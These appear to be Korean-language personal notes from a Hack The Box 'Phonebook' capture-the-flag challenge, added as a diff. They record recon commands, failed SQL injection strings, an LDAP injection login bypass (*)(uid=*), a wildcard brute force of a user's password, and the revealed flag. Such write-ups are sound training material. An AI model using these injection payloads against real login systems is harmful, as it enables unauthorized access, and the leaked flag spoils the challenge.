@@ -1,0 +1,62 @@
+ROOM:Phonebook
+TARGET: 83.136.253.59:35443
+
+
+namp -sV -sC 83.136.253.59
+
+gobuster -dir -u http://83.136.253.59:35443/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+
+login
+서비스 분석시도를 해봤으나 별다른 단서를 찾지못함
+
+웹페이지를 접속해보니 로그인 페이지 + 아래글이 나옴
+New (9.8.2020): You can now login using the workstation username and password! - Reese
+
+계정정보를 아는게없으니 단순한 sql injection시도
+' or 1=1 --
+1234
+' or 1=1 #
+1234
+다양하게 해봤으나 모두 실패
+따로 writeup을 찾아보니 ldap이란 sql사용중인걸로 확인 
+
+https://www.cobalt.io/blog/introduction-to-ldap-injection-attack
+ldap injection관련해서 찾아보니 
+
+id: *)(uid=*
+pw: *
+이대로 입력하니 로그인이 됐다
+
+
+search에 입력한값을 포함한 데이터베이스 내부 데이터를 출력해주는 사이트같다
+
+writeup을 보니 reese의 비밀번호를 알아내야할거같다
+
+ldap injection python 스크립트로 브루트 포싱시도 
+
+id: reese
+pw:
+a*
+b*
+c*
+d*
+...
+H* < session 응답받음
+Ha*
+Hb*
+...
+브루트 포싱 스크립트
+exploit.py작성
+
+python3 exploit.ty
+password: HTB{d1rectory_h4xx0r_is_k00l}
+
+
+
+
+
+
+
+
+
+
